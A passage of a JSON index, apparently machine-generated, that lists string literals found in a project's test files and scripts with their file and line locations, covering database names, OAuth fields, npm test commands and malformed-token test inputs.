        "scripts/fix_e2e_test_imports.py:79"
      ]
    },
    "netra_dev": {
      "value": "netra_dev",
      "category": "test_literals",
      "locations": [
        "scripts/test_async_postgres.py:147",
        "scripts/test_database_url_builder_comprehensive.py:81"
      ]
    },
    "netra_prod_user": {
      "value": "netra_prod_user",
      "category": "test_literals",
      "locations": [
        "scripts/test_database_url_builder_comprehensive.py:265"
      ]
    },
    "netra_production": {
      "value": "netra_production",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_database_failures.py:200",
        "auth_service/tests/test_critical_staging_database_failures.py:217",
        "scripts/test_database_url_builder_comprehensive.py:264"
      ]
    },
    "netra_staging": {
      "value": "netra_staging",
      "category": "test_literals",
      "locations": [
        "auth_service/test_staging_db_connection.py:41",
        "auth_service/test_staging_db_connection.py:57",
        "auth_service/test_staging_db_connection.py:94",
        "auth_service/test_url_construction.py:37",
        "auth_service/tests/test_critical_staging_database_failures.py:52",
        "auth_service/tests/test_critical_staging_database_failures.py:83",
        "auth_service/tests/test_critical_staging_database_failures.py:148",
        "auth_service/tests/test_critical_staging_database_failures.py:161",
        "auth_service/tests/test_critical_staging_database_failures.py:184",
        "auth_service/tests/test_critical_staging_database_failures.py:210"
      ]
    },
    "netra_staging_old": {
      "value": "netra_staging_old",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_database_failures.py:102"
      ]
    },
    "netra_stg": {
      "value": "netra_stg",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_database_failures.py:98"
      ]
    },
    "network_partition": {
      "value": "network_partition",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:44"
      ]
    },
    "new": {
      "value": "new",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_session_management.py:181"
      ]
    },
    "new files.": {
      "value": "new files.",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:1005",
        "scripts/auto_fix_test_violations.py:1008"
      ]
    },
    "new_files_created": {
      "value": "new_files_created",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_sizes.py:620",
        "scripts/auto_fix_test_sizes.py:663",
        "scripts/auto_fix_test_sizes.py:751"
      ]
    },
    "new_mock_token": {
      "value": "new_mock_token",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/utils/test_client.py:106"
      ]
    },
    "new_password": {
      "value": "new_password",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/utils/test_client.py:141"
      ]
    },
    "new_token": {
      "value": "new_token",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_pkce_token_refresh.py:142"
      ]
    },
    "next": {
      "value": "next",
      "category": "test_literals",
      "locations": [
        "scripts/cleanup_test_processes.py:70",
        "scripts/test_frontend.py:74",
        "scripts/test_frontend.py:102",
        "scripts/test_frontend.py:102"
      ]
    },
    "next_execution_config": {
      "value": "next_execution_config",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend_optimized.py:220",
        "scripts/test_backend_optimized.py:220"
      ]
    },
    "no:warnings": {
      "value": "no:warnings",
      "category": "test_literals",
      "locations": [
        "scripts/fix_common_test_issues.py:47",
        "scripts/test_backend.py:287"
      ]
    },
    "no_specific_test_found": {
      "value": "no_specific_test_found",
      "category": "test_literals",
      "locations": [
        "scripts/iterative_test_fix_loop.py:133"
      ]
    },
    "node": {
      "value": "node",
      "category": "test_literals",
      "locations": [
        "scripts/cleanup_test_processes.py:68",
        "scripts/cleanup_test_processes.py:74",
        "scripts/test_frontend.py:70",
        "scripts/test_frontend.py:80",
        "scripts/test_frontend.py:82"
      ]
    },
    "node_modules": {
      "value": "node_modules",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:103",
        "scripts/autonomous_review/test_reviewer.py:202",
        "scripts/business_value_test_index.py:131",
        "scripts/check_conftest_violations.py:22",
        "scripts/check_test_compliance.py:101",
        "scripts/cleanup_test_processes.py:129",
        "scripts/compliance/project_test_validator.py:41",
        "scripts/compliance/real_test_requirements_enforcer.py:133",
        "scripts/compliance/test_size_validator.py:157",
        "scripts/fix_all_test_issues.py:16"
      ]
    },
    "non-critical violations found": {
      "value": "non-critical violations found",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_requirements_enforcer.py:608"
      ]
    },
    "nonce": {
      "value": "nonce",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:213",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:280",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:326",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:353",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:391",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:1498"
      ]
    },
    "none": {
      "value": "none",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_token_security.py:194",
        "auth_service/tests/test_auth_token_security.py:211",
        "auth_service/tests/unified/test_jwt_validation.py:86",
        "auth_service/tests/unit/test_oauth_jwt_security_validator.py:89",
        "auth_service/tests/unit/test_oauth_jwt_security_validator.py:162",
        "auth_service/tests/unit/test_oauth_jwt_security_validator.py:183",
        "auth_service/tests/unit/test_oauth_jwt_security_validator.py:188",
        "auth_service/tests/unit/test_oauth_jwt_security_validator.py:239"
      ]
    },
    "nonexistent-workflow": {
      "value": "nonexistent-workflow",
      "category": "test_literals",
      "locations": [
        "scripts/test_verify_workflow_status.py:131"
      ]
    },
    "nonexistent/repo123456": {
      "value": "nonexistent/repo123456",
      "category": "test_literals",
      "locations": [
        "scripts/test_verify_workflow_status.py:122"
      ]
    },
    "nonexistent/repo123456789": {
      "value": "nonexistent/repo123456789",
      "category": "test_literals",
      "locations": [
        "scripts/test_verify_workflow_status_corrected.py:141"
      ]
    },
    "nonexistent_repo": {
      "value": "nonexistent_repo",
      "category": "test_literals",
      "locations": [
        "scripts/test_verify_workflow_status.py:120",
        "scripts/test_verify_workflow_status_corrected.py:139"
      ]
    },
    "nonexistent_workflow": {
      "value": "nonexistent_workflow",
      "category": "test_literals",
      "locations": [
        "scripts/test_verify_workflow_status.py:129"
      ]
    },
    "normal": {
      "value": "normal",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/models.py:63"
      ]
    },
    "normal_operation": {
      "value": "normal_operation",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/models.py:102"
      ]
    },
    "not concurrent and not performance": {
      "value": "not concurrent and not performance",
      "category": "test_literals",
      "locations": [
        "scripts/startup_test_executor.py:235"
      ]
    },
    "not configured": {
      "value": "not configured",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_database_manager_missing_method.py:100",
        "auth_service/tests/test_database_authentication_failures.py:199"
      ]
    },
    "not e2e": {
      "value": "not e2e",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_config.py:32",
        "scripts/unified_test_config.py:40"
      ]
    },
    "not found": {
      "value": "not found",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/utils/test_helpers.py:112"
      ]
    },
    "not found in database": {
      "value": "not found in database",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/base/test_mixins.py:33",
        "auth_service/tests/base/test_mixins.py:53",
        "auth_service/tests/utils/assertion_helpers.py:180",
        "auth_service/tests/utils/assertion_helpers.py:196"
      ]
    },
    "not integration": {
      "value": "not integration",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_config.py:32"
      ]
    },
    "not slow": {
      "value": "not slow",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_config.py:40"
      ]
    },
    "not-a-jwt": {
      "value": "not-a-jwt",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_token_blacklisting_basics.py:140"
      ]
    },
    "not-a-jwt-at-all": {
      "value": "not-a-jwt-at-all",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_oauth_id_token_validation.py:125"
      ]
    },
    "not-a-jwt-token": {
      "value": "not-a-jwt-token",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_security.py:586"
      ]
    },
    "not-a-url": {
      "value": "not-a-url",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_database_manager_missing_method.py:328"
      ]
    },
    "not.a.jwt": {
      "value": "not.a.jwt",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_jwt_security_validator.py:109"
      ]
    },
    "not.a.token": {
      "value": "not.a.token",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_token_validation.py:116"
      ]
    },
    "not.jwt.token": {
      "value": "not.jwt.token",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:1059"
      ]
    },
    "notAfter": {
      "value": "notAfter",
      "category": "test_literals",
      "locations": [
        "scripts/test_ssl_certificates_staging.py:82"
      ]
    },
    "not_base64!@#$": {
      "value": "not_base64!@#$",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_pkce_validation.py:95"
      ]
    },
    "npm": {
      "value": "npm",
      "category": "test_literals",
      "locations": [
        "scripts/fix_common_test_issues.py:58",
        "scripts/startup_test_executor.py:139",
        "scripts/startup_test_executor.py:143",
        "scripts/test_frontend.py:52",
        "scripts/test_frontend.py:71",
        "scripts/test_frontend.py:87",
        "scripts/test_frontend.py:89",
        "scripts/test_frontend.py:119",
        "scripts/test_frontend.py:221",
        "scripts/test_frontend.py:223"
      ]
    },
    "npm run test:critical -- --setupFilesAfterEnv='<rootDir>/": {
      "value": "npm run test:critical -- --setupFilesAfterEnv='<rootDir>/",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:571"
      ]
    },
    "npm run test:fast": {
      "value": "npm run test:fast",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:572"
      ]
    },
    "npm run test:integration -- --setupFilesAfterEnv='<rootDir>/": {
      "value": "npm run test:integration -- --setupFilesAfterEnv='<rootDir>/",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:570"
      ]
    },
    "npm run test:unit -- --setupFilesAfterEnv='<rootDir>/": {
      "value": "npm run test:unit -- --setupFilesAfterEnv='<rootDir>/",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:569"
      ]
    },
    "npm test": {
      "value": "npm test",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:96"
      ]
    },
    "npm test -- --passWithNoTests --ci --silent": {
      "value": "npm test -- --passWithNoTests --ci --silent",
      "category": "test_literals",
      "locations": [
        "scripts/test_frontend_quick.py:17"
      ]
    },
    "npm test -- --setupFilesAfterEnv='<rootDir>/": {
      "value": "npm test -- --setupFilesAfterEnv='<rootDir>/",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:575"
      ]
    },
    "npm.cmd": {
      "value": "npm.cmd",
      "category": "test_literals",
      "locations": [
        "scripts/fix_common_test_issues.py:58"
      ]
    },
    "npx": {
      "value": "npx",
      "category": "test_literals",
      "locations": [
        "scripts/test_frontend.py:335"
      ]
    },
    "nt": {
      "value": "nt",
      "category": "test_literals",
      "locations": [
        "scripts/test_websocket_dev_mode.py:63",
        "scripts/test_websocket_dev_mode.py:241"
      ]
    },
    "oauth": {
      "value": "oauth",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/auth-service-down-critical-scenarios.py:402",
        "auth_service/tests/config/test_env.py:217",
        "auth_service/tests/factories/audit_factory.py:75",
        "scripts/analyze_test_mocks.py:44",
        "scripts/unified_test_config.py:106"
      ]
    },
    "oauth2/v2/auth": {
      "value": "oauth2/v2/auth",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_auth_oauth_google.py:104"
      ]
    },
    "oauth_callback": {
      "value": "oauth_callback",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/audit_factory.py:33"
      ]
    },
    "oauth_client": {
      "value": "oauth_client",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/base/test_mixins.py:170"
      ]
    },
    "oauth_client_id": {
      "value": "oauth_client_id",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_jwt_security_validator.py:228"
      ]
    },
    "oauth_code:": {
      "value": "oauth_code:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_authorization_code_reuse_prevention.py:145",
        "auth_service/tests/unit/test_oauth_authorization_code_reuse_prevention.py:169",
        "auth_service/tests/unit/test_oauth_authorization_code_reuse_prevention.py:184",
        "auth_service/tests/unit/test_oauth_authorization_code_reuse_prevention.py:206",
        "auth_service/tests/unit/test_oauth_authorization_code_reuse_prevention.py:240",
        "auth_service/tests/unit/test_oauth_authorization_code_reuse_prevention.py:277",
        "auth_service/tests/unit/test_oauth_authorization_code_reuse_prevention.py:379"
      ]
    },
    "oauth_config": {
      "value": "oauth_config",
      "category": "test_literals",
      "locations": [
        "scripts/test_config_loading.py:100"
      ]
    },
    "oauth_env_matching": {
      "value": "oauth_env_matching",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_five_whys_reproduction.py:296",
        "auth_service/tests/test_five_whys_reproduction.py:309"
      ]
    },
    "oauth_error": {
      "value": "oauth_error",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/audit_factory.py:34"
      ]
    },
    "oauth_initiation": {
      "value": "oauth_initiation",
      "category": "test_literals",
      "locations": [
        "scripts/test_oauth_local.py:50",
        "scripts/test_oauth_local.py:201",
        "scripts/test_oauth_local.py:214",
        "scripts/test_oauth_local.py:226",
        "scripts/test_oauth_local.py:413",
        "scripts/test_oauth_local.py:413"
      ]
    },
    "oauth_mock_token": {
      "value": "oauth_mock_token",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/utils/test_client.py:181"
      ]
    },
    "oauth_nonce:": {
      "value": "oauth_nonce:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_authorization_code_reuse_prevention.py:380"
      ]
    },
    "oauth_provider": {
      "value": "oauth_provider",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/audit_factory.py:175"
      ]
    },
    "oauth_response": {
      "value": "oauth_response",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/base/test_mixins.py:247"
      ]
    },
    "oauth_state:": {
      "value": "oauth_state:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_state_csrf_vulnerability.py:187"
      ]
    },
    "oauth_state_": {
      "value": "oauth_state_",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/token_factory.py:233"
      ]
    },
    "oauth_token_123": {
      "value": "oauth_token_123",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_models.py:57",
        "auth_service/tests/unit/test_oauth_models.py:61"
      ]
    },
    "oauth_user_id": {
      "value": "oauth_user_id",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_jwt_security_validator.py:231"
      ]
    },
    "oauth_validation": {
      "value": "oauth_validation",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_five_whys_reproduction.py:291",
        "auth_service/tests/test_five_whys_reproduction.py:308"
      ]
    },
    "object_type": {
      "value": "object_type",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_batch.py:57"
      ]
    },
    "observability": {
      "value": "observability",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:102",
        "scripts/business_value_test_index.py:421",
        "scripts/business_value_test_index.py:497"
      ]
    },
    "observability|monitoring|logging|tracing|metrics": {
      "value": "observability|monitoring|logging|tracing|metrics",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:102"
      ]
    },
    "occurrence_rate": {
      "value": "occurrence_rate",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/models.py:115",
        "netra_backend/app/services/realistic_test_data/models.py:120",
        "netra_backend/app/services/realistic_test_data/models.py:126",
        "netra_backend/app/services/realistic_test_data/models.py:131",
        "netra_backend/app/services/realistic_test_data/models.py:136"
      ]
    },
    "onboard": {
      "value": "onboard",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_sizes.py:356"
      ]
    },
    "onerror=": {
      "value": "onerror=",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_security.py:268",
        "auth_service/tests/test_security.py:307"
      ]
    },
    "open": {
      "value": "open",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_mocks.py:64"
      ]
    },
    "openai": {
      "value": "openai",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_mocks.py:40"
      ]
    },
    "openai|anthropic|gemini|gpt|claude": {
      "value": "openai|anthropic|gemini|gpt|claude",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:441"
      ]
    },
    "openid email": {
      "value": "openid email",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_auth_oauth_google.py:312"
      ]
    },
    "openid email profile": {
      "value": "openid email profile",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/token_factory.py:197",
        "auth_service/tests/integration/test_auth_oauth_google.py:311"
      ]
    },
    "openid profile": {
      "value": "openid profile",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_auth_oauth_google.py:313"
      ]
    },
    "operation_id": {
      "value": "operation_id",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_redis_connection_failover.py:307",
        "auth_service/tests/integration/test_redis_connection_failover.py:315",
        "auth_service/tests/integration/test_redis_connection_failover.py:329",
        "auth_service/tests/integration/test_redis_connection_failover.py:330",
        "auth_service/tests/integration/test_redis_connection_failover.py:331"
      ]
    },
    "optimization": {
      "value": "optimization",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend_optimized.py:55",
        "scripts/test_backend_optimized.py:61",
        "scripts/test_backend_optimized.py:67",
        "scripts/test_backend_optimized.py:73",
        "scripts/test_backend_optimized.py:79",
        "scripts/test_backend_optimized.py:89",
        "scripts/test_backend_optimized.py:98"
      ]
    },
    "optimization_level": {
      "value": "optimization_level",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend_optimized.py:166"
      ]
    },
    "optimization_recommendations": {
      "value": "optimization_recommendations",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend_optimized.py:218",
        "scripts/test_backend_optimized.py:340"
      ]
    },
    "optimize": {
      "value": "optimize",
      "category": "test_literals",
      "locations": [
        "scripts/test_cold_start_e2e.py:54"
      ]
    },
    "optimized_test_cache": {
      "value": "optimized_test_cache",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend_optimized.py:109",
        "scripts/test_backend_optimized.py:403"
      ]
    },
    "organizations": {
      "value": "organizations",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:496"
      ]
    },
    "origin": {
      "value": "origin",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:329",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:1085"
      ]
    },
    "original_file": {
      "value": "original_file",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_refactor_helper.py:588",
        "scripts/compliance/test_size_validator.py:397"
      ]
    },
    "original_functions": {
      "value": "original_functions",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_sizes.py:693"
      ]
    },
    "original_lines": {
      "value": "original_lines",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_sizes.py:692"
      ]
    },
    "os": {
      "value": "os",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_refactor_helper.py:131"
      ]
    },
    "os.getenv(\"ENVIRONMENT\", \"staging\")": {
      "value": "os.getenv(\"ENVIRONMENT\", \"staging\")",
      "category": "test_literals",
      "locations": [
        "scripts/test_environment_detection.py:81",
        "scripts/test_environment_detection.py:90",
        "scripts/test_environment_detection.py:99"
      ]
    },
    "other": {
      "value": "other",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_mocks.py:24",
        "scripts/analyze_test_mocks.py:31",
        "scripts/analyze_test_mocks.py:67",
        "scripts/business_value_test_index.py:407",
        "scripts/business_value_test_index.py:432",
        "scripts/compliance/test_refactor_helper.py:213"
      ]
    },
    "output": {
      "value": "output",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/llm_response_generator.py:49",
        "netra_backend/app/services/realistic_test_data/models.py:34",
        "netra_backend/app/services/realistic_test_data/models.py:44",
        "netra_backend/app/services/realistic_test_data/models.py:54",
        "netra_backend/app/services/realistic_test_data/models.py:64",
        "netra_backend/app/services/realistic_test_data/models.py:74",
        "scripts/real_service_test_metrics.py:33",
        "scripts/real_service_test_metrics.py:34",
        "scripts/real_service_test_metrics.py:35",
        "scripts/real_service_test_metrics.py:36"
      ]
    },
    "overall_similarity": {
      "value": "overall_similarity",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_overlap.py:372",
        "scripts/analyze_test_overlap.py:593",
        "scripts/analyze_test_overlap.py:608",
        "scripts/analyze_test_overlap.py:629",
        "scripts/analyze_test_overlap.py:643"
      ]
    },
    "overall_status": {
      "value": "overall_status",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_staging_database_credentials.py:393"
      ]
    },
    "overall_success": {
      "value": "overall_success",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:671",
        "scripts/unified_test_runner.py:703"
      ]
    },
    "overflow": {
      "value": "overflow",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_database_manager.py:259"
      ]
    },
    "overload-test-token-": {
      "value": "overload-test-token-",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/auth-service-down-critical-scenarios.py:266"
      ]
    },
    "oversized files": {
      "value": "oversized files",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_sizes.py:643"
      ]
    },
    "p50": {
      "value": "p50",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/workload_simulator.py:123",
        "netra_backend/app/services/realistic_test_data/workload_simulator.py:151"
      ]
    },
    "p50_latency_ms": {
      "value": "p50_latency_ms",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/log_generator.py:164"
      ]
    },
    "p95": {
      "value": "p95",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/workload_simulator.py:123",
        "netra_backend/app/services/realistic_test_data/workload_simulator.py:151"
      ]
    },
    "p95_latency_ms": {
      "value": "p95_latency_ms",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/log_generator.py:165",
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:199"
      ]
    },
    "p99 latency": {
      "value": "p99 latency",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/models.py:99"
      ]
    },
    "p99_latency_ms": {
      "value": "p99_latency_ms",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/log_generator.py:166"
      ]
    },
    "p=": {
      "value": "p=",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_password_hashing_basics.py:113"
      ]
    },
    "package.json": {
      "value": "package.json",
      "category": "test_literals",
      "locations": [
        "scripts/test_frontend.py:95"
      ]
    },
    "pandemic_surge": {
      "value": "pandemic_surge",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/workload_simulator.py:41"
      ]
    },
    "parallel": {
      "value": "parallel",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_config.py:26",
        "scripts/unified_test_config.py:34",
        "scripts/unified_test_config.py:42",
        "scripts/unified_test_config.py:50",
        "scripts/unified_test_config.py:58",
        "scripts/unified_test_config.py:66",
        "scripts/unified_test_config.py:193",
        "scripts/unified_test_config.py:200",
        "scripts/unified_test_config.py:207",
        "scripts/unified_test_config.py:214"
      ]
    },
    "parallel_factor": {
      "value": "parallel_factor",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend_optimized.py:57",
        "scripts/test_backend_optimized.py:63",
        "scripts/test_backend_optimized.py:69",
        "scripts/test_backend_optimized.py:75",
        "scripts/test_backend_optimized.py:81",
        "scripts/test_backend_optimized.py:91",
        "scripts/test_backend_optimized.py:100",
        "scripts/test_backend_optimized.py:168",
        "scripts/test_backend_optimized.py:168"
      ]
    },
    "parallel_safe": {
      "value": "parallel_safe",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:900"
      ]
    },
    "parameter": {
      "value": "parameter",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_staging_auth_ssl_failures.py:187"
      ]
    },
    "parametrize": {
      "value": "parametrize",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_overlap.py:194"
      ]
    },
    "partial_result": {
      "value": "partial_result",
      "category": "test_literals",
      "locations": [
        "scripts/test_cold_start_e2e.py:411"
      ]
    },
    "partition": {
      "value": "partition",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/auth-service-down-critical-scenarios.py:331"
      ]
    },
    "partition-test-token-": {
      "value": "partition-test-token-",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/auth-service-down-critical-scenarios.py:324"
      ]
    },
    "parts": {
      "value": "parts",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/utils/test_helpers.py:217",
        "scripts/fix_all_test_issues.py:203"
      ]
    },
    "pass": {
      "value": "pass",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_database_connection_validation.py:384",
        "scripts/auto_fix_test_sizes.py:579",
        "scripts/autonomous_review/test_generator.py:157"
      ]
    },
    "pass_rate": {
      "value": "pass_rate",
      "category": "test_literals",
      "locations": [
        "scripts/team_updates_test_analyzer.py:146"
      ]
    },
    "passed": {
      "value": "passed",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_staging_database_credentials.py:393",
        "scripts/batch_fix_and_test.py:142",
        "scripts/fix_test_batch.py:284",
        "scripts/real_service_test_metrics.py:78",
        "scripts/real_service_test_metrics.py:132",
        "scripts/real_service_test_metrics.py:196",
        "scripts/startup_test_executor.py:28",
        "scripts/team_updates_test_analyzer.py:104",
        "scripts/team_updates_test_analyzer.py:110",
        "scripts/team_updates_test_analyzer.py:136"
      ]
    },
    "passed,": {
      "value": "passed,",
      "category": "test_literals",
      "locations": [
        "scripts/test_auth_integration.py:156",
        "scripts/test_staging_startup.py:271"
      ]
    },
    "passed_tests": {
      "value": "passed_tests",
      "category": "test_literals",
      "locations": [
        "scripts/team_updates_test_analyzer.py:144"
      ]
    },
    "password": {
      "value": "password",
      "category": "test_literals",
      "locations": [
        "auth_service/test_staging_db_connection.py:59",
        "auth_service/test_staging_db_connection.py:96",
        "auth_service/tests/factories/audit_factory.py:75",
        "auth_service/tests/test_five_whys_reproduction.py:38",
        "auth_service/tests/test_security.py:147",
        "auth_service/tests/test_security.py:159",
        "auth_service/tests/test_security.py:257",
        "auth_service/tests/test_security.py:292",
        "auth_service/tests/test_security.py:341",
        "auth_service/tests/test_security.py:359"
      ]
    },
    "password authentication failed": {
      "value": "password authentication failed",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_database_authentication_failures.py:165",
        "auth_service/tests/test_database_authentication_failures.py:276",
        "auth_service/tests/test_database_connection_validation.py:162",
        "auth_service/tests/test_database_connection_validation.py:225",
        "auth_service/tests/test_staging_database_credentials.py:480"
      ]
    },
    "password authentication failed (attempt": {
      "value": "password authentication failed (attempt",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_database_connection_validation.py:358"
      ]
    },
    "password authentication failed for user 'postgres'": {
      "value": "password authentication failed for user 'postgres'",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_database_authentication_failures.py:153",
        "auth_service/tests/test_database_authentication_failures.py:371",
        "auth_service/tests/test_database_connection_validation.py:84",
        "auth_service/tests/test_database_connection_validation.py:198"
      ]
    },
    "password authentication failed for user 'user_pr-4'": {
      "value": "password authentication failed for user 'user_pr-4'",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_database_authentication_failures.py:370",
        "auth_service/tests/test_staging_database_credentials.py:470"
      ]
    },
    "password_change": {
      "value": "password_change",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/audit_factory.py:22"
      ]
    },
    "password_hasher": {
      "value": "password_hasher",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/base/test_mixins.py:166",
        "auth_service/tests/base/test_mixins.py:176",
        "auth_service/tests/base/test_mixins.py:177"
      ]
    },
    "password_reset": {
      "value": "password_reset",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/audit_factory.py:23"
      ]
    },
    "patch": {
      "value": "patch",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_mocks.py:104",
        "scripts/compliance/test_refactor_helper.py:200"
      ]
    },
    "patch(": {
      "value": "patch(",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_requirements_enforcer.py:358"
      ]
    },
    "patch\\(": {
      "value": "patch\\(",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/project_test_validator.py:274",
        "scripts/compliance/real_test_validator.py:236"
      ]
    },
    "path": {
      "value": "path",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_size_validator.py:83",
        "scripts/compliance/test_size_validator.py:84",
        "scripts/compliance/test_size_validator.py:100",
        "scripts/compliance/test_size_validator.py:110",
        "scripts/compliance/test_size_validator.py:428",
        "scripts/compliance/test_size_validator.py:432",
        "scripts/test_failure_scanner.py:157",
        "scripts/test_workflows_with_act.py:306",
        "scripts/unified_test_runner.py:81",
        "scripts/unified_test_runner.py:87"
      ]
    },
    "path.exists": {
      "value": "path.exists",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_mocks.py:64"
      ]
    },
    "path_pattern": {
      "value": "path_pattern",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_config.py:244",
        "scripts/unified_test_config.py:249",
        "scripts/unified_test_config.py:254",
        "scripts/unified_test_config.py:259",
        "scripts/unified_test_config.py:264"
      ]
